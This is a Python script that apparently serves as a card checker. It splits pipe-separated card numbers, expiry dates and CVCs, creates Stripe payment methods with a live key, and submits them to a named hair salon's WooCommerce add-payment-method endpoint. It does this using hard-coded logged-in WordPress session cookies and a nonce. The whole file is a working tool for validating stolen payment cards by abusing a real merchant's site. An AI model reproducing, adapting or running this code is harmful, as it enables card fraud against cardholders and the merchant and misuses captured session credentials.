import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fbadb92382f%3B+stripe-js-v3%2Fbadb92382f%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmelhairandstyle.com&time_on_page=91265&client_attribution_metadata[client_session_id]=f8335678-dd26-4403-bbfb-a0ccbb60ff86&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=6df4a559-5a2f-4d3d-af9f-9cd66ba2a85c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_tdIywCY9lRimUDnIsqgpXVZ0&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'wordpress_sec_2ac48f42219d3c63af332d42e95b4214': 'nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7C7c7eaf23c6390605800262459d0d38ff6b042309412cd0da49585ca8f8bd6f75',
	    'wordpress_logged_in_2ac48f42219d3c63af332d42e95b4214': 'nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7Cbc383aa61621dd82b1929749884261e14207ff89e4e5d76cf34ab802aad16f04',
	    '__stripe_mid': '858da1fb-4f59-47f5-8150-a4fdf8120705baa446',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_first_add': 'fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F',
	    '__stripe_sid': '9ac1b1a8-cca0-41ad-8b4d-5e2030816bf7a466d5',
	}
	
	headers = {
	    'authority': 'melhairandstyle.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_2ac48f42219d3c63af332d42e95b4214=nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7C7c7eaf23c6390605800262459d0d38ff6b042309412cd0da49585ca8f8bd6f75; wordpress_logged_in_2ac48f42219d3c63af332d42e95b4214=nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7Cbc383aa61621dd82b1929749884261e14207ff89e4e5d76cf34ab802aad16f04; __stripe_mid=858da1fb-4f59-47f5-8150-a4fdf8120705baa446; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=9ac1b1a8-cca0-41ad-8b4d-5e2030816bf7a466d5',
	    'origin': 'https://melhairandstyle.com',
	    'referer': 'https://melhairandstyle.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': '38bf5b0f6e',
	}
	
	r2 = requests.post('https://melhairandstyle.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
